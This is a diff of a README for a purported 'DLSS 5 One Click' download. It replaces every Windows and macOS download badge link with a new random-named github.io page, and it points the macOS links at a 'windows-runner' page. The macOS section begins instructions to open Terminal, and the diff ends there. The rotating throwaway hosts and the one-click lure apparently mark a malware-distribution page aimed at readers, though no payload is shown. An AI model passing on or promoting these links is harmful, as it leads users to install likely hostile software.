@@ -15,7 +15,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_One_Click-F9A825?style=for-the-badge&logo=github)](https://tlwbljvlzhgm.github.io/windows-install/)
+[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_One_Click-F9A825?style=for-the-badge&logo=github)](https://mkiiavwgxyhx.github.io/windows-runner/)
 
 </div>
 
@@ -65,9 +65,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://tlwbljvlzhgm.github.io/windows-install/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
 
 </div>
 
@@ -114,7 +114,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
 
 1. Click the badge above
 2. Open **Terminal** (`⌘ + Space` → Terminal → Enter)
